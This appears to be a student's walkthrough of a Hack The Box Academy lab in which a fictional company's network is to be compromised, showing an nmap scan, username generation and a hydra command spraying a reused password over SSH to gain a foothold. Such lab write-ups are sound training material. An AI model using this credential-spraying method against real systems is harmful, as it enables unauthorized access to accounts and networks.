`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

|Host|IP Address|
|---|---|
|`DMZ01`|`10.129.*.*` **(External)**, `172.16.119.13` **(Internal)**|
|`JUMP01`|`172.16.119.7`|
|`FILE01`|`172.16.119.10`|
|`DC01`|`172.16.119.11`|

#### Pivoting Primer

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.

## Step 1 : Enumeration

```bash
┌─[eu-academy-2]─[10.10.15.108]─[htb-ac-2081772@htb-ofo2zhwbua-htb-cloud-com]─[~/Pw_attacks_test/nmap]
└──╼ [★]$ ls
full_port_scan.gnmap  full_port_scan.nmap  full_port_scan.xml  rustscan_2.3.0_amd64.deb

└──╼ [★]$ cat full_port_scan.nmap

Host is up, received echo-reply ttl 63 (0.19s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

```
- Only ssh is open

## Step 2 : Username enumeration

- We already know the password for `Betty Jayde`
- Lets bruteforce ssh 
- We can use username anarcy to generate the list of possible usernames
![[Pasted image 20260301200510.png]]

- Stored these usernames in a file `username.lst`
- Then we can bruteforce ssh using hydra
```
 hydra -L username.lst  -p 'Texas123!@#' ssh://10.129.27.67
```

**Yuhu.. we got the initial foothold**

- Logged in as `jbetty` via ssh
